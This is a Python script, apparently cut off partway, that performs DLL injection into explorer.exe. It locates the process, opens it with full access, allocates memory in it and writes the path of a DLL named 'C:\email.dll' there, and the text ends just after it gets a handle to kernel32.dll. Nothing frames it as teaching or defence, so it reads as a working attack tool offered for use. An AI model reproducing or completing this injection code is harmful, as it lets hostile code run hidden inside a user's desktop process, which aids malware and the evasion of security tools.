import ctypes
import ctypes.wintypes as wintypes
import psutil

try:
    import win32con
except ImportError:
    raise ImportError("The 'win32con' module is missing. Install it using 'pip install pywin32'.")

# Define a cleanup function to release resources properly
def cleanup(h_process, arg_address=None):
    if arg_address:
        kernel32.VirtualFreeEx(h_process, arg_address, 0, win32con.MEM_RELEASE)
    if h_process:
        kernel32.CloseHandle(h_process)

# Your DLL path
dll_path = "C:\\email.dll"

# Find explorer.exe PID
explorer_pid = None
for proc in psutil.process_iter(['pid', 'name']):
    if proc.info['name'] and proc.info['name'].lower() == 'explorer.exe':
        explorer_pid = proc.info['pid']
        break

if not explorer_pid:
    raise Exception("Could not find explorer.exe")

print(f"[*] Explorer.exe PID: {explorer_pid}")

# Open process with all access
kernel32 = ctypes.windll.kernel32
h_process = kernel32.OpenProcess(0x1F0FFF, False, explorer_pid)
if not h_process:
    raise Exception("Failed to get handle to explorer.exe")
print(f"[*] Handle to explorer.exe: {h_process}")

# Allocate memory in target process
dll_path_bytes = dll_path.encode('utf-8')
path_len = len(dll_path_bytes) + 1
arg_address = kernel32.VirtualAllocEx(h_process, 0, path_len, win32con.MEM_COMMIT, win32con.PAGE_READWRITE)
if not arg_address:
    cleanup(h_process)
    raise Exception("Failed to allocate memory in target process")
print(f"[*] Allocated memory at: {hex(arg_address)}")

# Write DLL path into allocated memory
written = ctypes.c_size_t(0)
if not kernel32.WriteProcessMemory(h_process, arg_address, dll_path_bytes, path_len, ctypes.byref(written)):
    cleanup(h_process, arg_address)
    raise Exception("Failed to write to target process memory")
print(f"[*] Wrote DLL path to memory: {dll_path}")

# Get handle to kernel32.dll
h_kernel32 = kernel32.GetModuleHandleW("kernel32.dll")

